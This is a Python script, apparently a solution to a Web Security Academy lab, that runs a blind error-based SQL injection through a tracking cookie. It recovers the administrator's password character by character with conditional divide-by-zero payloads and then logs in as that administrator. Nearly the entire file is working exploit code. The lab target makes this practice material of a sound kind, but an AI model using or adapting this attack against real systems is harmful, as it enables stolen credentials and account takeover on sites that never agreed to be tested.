import asyncio
import aiohttp
from bs4 import BeautifulSoup

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"
FILTER_URL = BASE_URL + "/filter"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

async def payload_test(session: aiohttp.ClientSession, payload: str) -> int:
    """測試 payload 並返回狀態碼"""
    print(payload)
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    
    try:
        async with session.get(FILTER_URL, params={"category": "Pets"}, cookies=cookies, timeout=10) as response:
            print(response.status)
            return response.status
    except Exception as e:
        print(f"Error: {e}")
        return 0

async def find_pw_len(session: aiohttp.ClientSession) -> int:
    """使用二分法找密碼長度（這個沒問題）"""
    low = 1
    high = 24
    
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"'||(SELECT CASE WHEN LENGTH(password)>{mid} THEN TO_CHAR(1/0) ELSE '' END "
            f"FROM users WHERE username='administrator')||'"
        )
        
        response_status = await payload_test(session, payload)
        if response_status == 500:
            low = mid + 1
        else:
            high = mid - 1
    
    return low

async def find_pw_with_like(session: aiohttp.ClientSession, pw_len: int) -> str:
    """使用 LIKE 操作符逐字元找密碼"""
    pw = ""
    
    for pos in range(1, pw_len + 1):
        print(f"\n🔍 查找位置 {pos}:")
        found = False
        
        for word in WORD_LIST:
            # 構建當前嘗試的密碼前綴
            current_try = pw + word
            
            # 使用 LIKE 操作符檢查是否匹配
            payload = f"'||(SELECT CASE WHEN password LIKE '{current_try}%' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            
            response_status = await payload_test(session, payload)
            if response_status == 500:
                pw += word
                print(f"✅ 位置 {pos}: 找到 '{word}' -> 目前: '{pw}'")
                found = True
                break
        
        if not found:
            pw += "?"
            print(f"❌ 位置 {pos}: 未找到匹配字元")
    
    return pw

async def find_pw_with_like_optimized(session: aiohttp.ClientSession, pw_len: int) -> str:
    """優化版本：使用 LIKE 和長度檢查"""
    pw = ""
    
    for pos in range(1, pw_len + 1):
        print(f"\n🔍 查找位置 {pos}:")
        found = False
        
        for word in WORD_LIST:
            current_try = pw + word
            
            # 優化：同時檢查長度和前綴，更精確
            if pos == pw_len:
                # 如果是最後一個字元，要求完全匹配
                payload = f"'||(SELECT CASE WHEN password='{current_try}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            else:
                # 不是最後一個字元，檢查前綴
                payload = f"'||(SELECT CASE WHEN password LIKE '{current_try}%' AND LENGTH(password)>={len(current_try)} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            
            response_status = await payload_test(session, payload)
            if response_status == 500:
                pw += word
                print(f"✅ 位置 {pos}: 找到 '{word}' -> 目前: '{pw}'")
                found = True
                break
        
        if not found:
            pw += "?"
            print(f"❌ 位置 {pos}: 未找到匹配字元")
            break  # 如果找不到，可能長度判斷有誤
    
    return pw

async def verify_password(session: aiohttp.ClientSession, password: str) -> bool:
    """驗證找到的密碼是否正確"""
    payload = f"'||(SELECT CASE WHEN password='{password}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    status = await payload_test(session, payload)
    return status == 500

async def login(password: str):
    """使用找到的密碼登入"""
    async with aiohttp.ClientSession() as session:
        url = BASE_URL + "/login"
        
        # GET 登入頁面獲取 CSRF token
        async with session.get(url, timeout=10) as get_response:
            html_content = await get_response.text()
        
        soup = BeautifulSoup(html_content, "html.parser")
        csrf_input = soup.find("input", {"name": "csrf"})
        
        if not csrf_input:
            print("無法找到 CSRF token")
            return
        
        csrf = csrf_input.get("value")
        
        data = {
            "csrf": csrf,
            "username": "administrator",
            "password": password
        }
        
        # POST 登入請求
        async with session.post(url, data=data, timeout=10) as post_response:
            response_text = await post_response.text()
            
            if "Log out" in response_text or "My account" in response_text:
                print("✅ 登入成功！")
                return True
            else:
                print("❌ 登入失敗")
                return False

async def test_like_method():
    """測試 LIKE 方法是否正常工作"""
    print("=== 測試 LIKE 方法 ===\n")
    
    test_cases = [
        # 測試已知會成功的情況
        ("LIKE a%", "'||(SELECT CASE WHEN password LIKE 'a%' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        ("LIKE b%", "'||(SELECT CASE WHEN password LIKE 'b%' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        ("LIKE 0%", "'||(SELECT CASE WHEN password LIKE '0%' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
    ]
    
    async with aiohttp.ClientSession() as session:
        for name, payload in test_cases:
            status = await payload_test(session, payload)
            print(f"{name}: {status}")
        
        print("\n從測試結果來判斷密碼第一個字元的可能值...")

async def main():
    async with aiohttp.ClientSession() as session:
        # 先測試 LIKE 方法
        await test_like_method()
        
        print("\n" + "="*60)
        print("=== 開始破解密碼 ===\n")
        
        # 找密碼長度
        pw_len = await find_pw_len(session)
        print(f"密碼長度: {pw_len}")
        
        # 使用 LIKE 方法找密碼
        print(f"\n🔍 使用 LIKE 方法查找密碼...")
        pw = await find_pw_with_like_optimized(session, pw_len)
        print(f"\n[+] Found password: '{pw}'")
        
        # 驗證密碼
        if pw and not all(c == '?' for c in pw):
            print(f"\n🔍 驗證密碼...")
            is_correct = await verify_password(session, pw)
            print(f"[+] 密碼驗證: {'✅ 正確' if is_correct else '❌ 錯誤'}")
            
            if is_correct:
                print(f"\n🎉 成功! 開始登入...")
                await login(pw)
        else:
            print("\n❌ 密碼破解失敗")

if __name__ == "__main__":
    asyncio.run(main())